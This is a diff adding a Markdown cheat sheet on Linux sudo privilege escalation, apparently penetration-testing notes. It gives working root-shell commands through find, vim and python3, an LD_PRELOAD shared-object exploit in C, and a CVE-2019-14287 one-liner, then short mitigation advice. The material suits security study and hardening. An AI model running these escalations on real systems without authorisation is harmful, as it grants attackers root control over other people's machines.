@@ -1,0 +1,69 @@
+# Privilege Escalation: Sudo
+
+## Enumeration
+```bash
+sudo -l
+```
+Shows what commands the current user can run as root (or another user) without a password, or with one.
+
+## Exploiting Misconfigured Sudo Rights
+
+### 1. NOPASSWD binaries → GTFOBins
+If `sudo -l` shows something like:
+```
+(root) NOPASSWD: /usr/bin/find
+```
+Check https://gtfobins.github.io/ for that binary's `sudo` exploitation technique.
+
+Example — `find`:
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+Example — `vim`:
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+Example — `python3`:
+```bash
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+
+### 2. Wildcard/Path Injection
+If a script is run via sudo with a relative or wildcard path, you may be able to hijack it.
+
+### 3. LD_PRELOAD Abuse
+If `env_keep+=LD_PRELOAD` is set:
+```c
+// shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/sh -p");
+}
+```
+```bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/path/shell.so <allowed_command>
+```
+
+### 4. Sudo Version Exploits
+Older sudo versions (e.g. CVE-2019-14287, CVE-2021-3156 "Baron Samedit") have direct bypasses.
+```bash
+sudo -u#-1 whoami      # CVE-2019-14287 (user ID -1 trick)
+```
+
+## Checklist
+- [ ] Run `sudo -l`
+- [ ] Check every allowed binary against GTFOBins
+- [ ] Check `sudo` version for known CVEs
+- [ ] Check `env_keep` for `LD_PRELOAD`/`LD_LIBRARY_PATH`
+
+## Mitigation
+- Principle of least privilege in `/etc/sudoers`
+- Avoid `NOPASSWD` on shell-capable binaries
+- Keep sudo package updated
